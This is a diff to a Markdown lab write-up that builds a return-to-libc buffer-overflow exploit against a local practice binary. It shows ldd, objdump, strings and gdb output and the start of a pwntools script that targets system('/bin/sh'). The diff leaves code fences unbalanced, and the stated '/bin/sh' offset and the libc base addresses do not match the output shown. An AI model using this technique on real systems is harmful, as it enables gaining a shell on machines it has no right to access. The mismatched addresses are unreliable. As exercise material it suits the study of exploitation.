@@ -37,18 +37,17 @@ The vulnerability is a typical buffer overflow. We need to find the offset. The 
 
 We need to find the addresses to execute `system ("/bin/sh")`. Since our executable does not contain the call, we inspect libc:
 
-```
+```bash
 # ldd vuln
         linux-vdso.so.1 (0x00007ffff7ffd000)
         libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7e14000)
         /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
 
-```bash
+
 # objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Dump the disassembly (Intel format) into the file dump
 
 # strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Search for /bin/sh and find it at offset 0x183cee
-```
-└─$ strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+
  1a7e43 /bin/sh
                                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/bufferoverflow/exercises/stackOverflow/x64]
@@ -74,7 +73,7 @@ Reading symbols from vuln...done.
 gef➤ b main 
 Breakpoint 1 at 0x1154: file vuln.c, line 7.
 gef➤ run
-gef➤ vmmap
+gef➤  vmmap
 [ Legend:  Code | Stack | Heap ]
 Start              End                Offset             Perm Path
 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
@@ -134,7 +133,7 @@ Therefore, we have the offset of the gadget we are looking for:
 # coding: utf-8
 
 from pwn import *
-```python
+
 # Definition of addresses (see above)
 libc_base = 0x00007ffff7db2000
 system_addr = libc_base + 0x528f0
